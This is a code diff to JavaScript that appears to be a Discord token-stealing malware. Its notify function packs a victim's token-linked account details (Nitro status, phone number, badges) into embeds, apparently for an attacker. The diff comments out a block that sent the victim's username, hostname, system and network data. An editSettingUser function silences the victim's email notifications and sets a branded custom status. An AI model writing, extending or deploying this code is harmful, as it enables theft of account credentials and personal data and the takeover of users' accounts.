@@ -266,7 +266,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.push(
         { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Nitro", value: nitro, inline: true },
+        { name: "Nitro", value: `\`\`\`${nitro}\`\`\``, inline: false },
         { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
         { name: "\u200b", value: "\u200b", inline: false },
         { name: "Badges", value: badges, inline: true },
@@ -282,14 +282,14 @@ const notify = async (ctx, token, user) => {
         ctx.embeds.push({ title: servers.title, description: servers.description });
     }
 
-    ctx.embeds.push({
-        title: `System Information`,
-        fields: [
-            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
-            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
-            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
-        ]
-    });
+    // ctx.embeds.push({
+    //     title: `System Information`,
+    //     fields: [
+    //         { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
+    //         { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
+    //         { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
+    //     ]
+    // });
 
     ctx.embeds.forEach(embed => {
         embed.color = 1752220;
@@ -342,7 +342,7 @@ const editSettingUser = async (token) => {
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
             custom_status: {
-                text: 'violatedbyevos',
+                text: 'evos 2.0',
                 expires_at: null,
                 emoji_id: null,
                 emoji_name: null
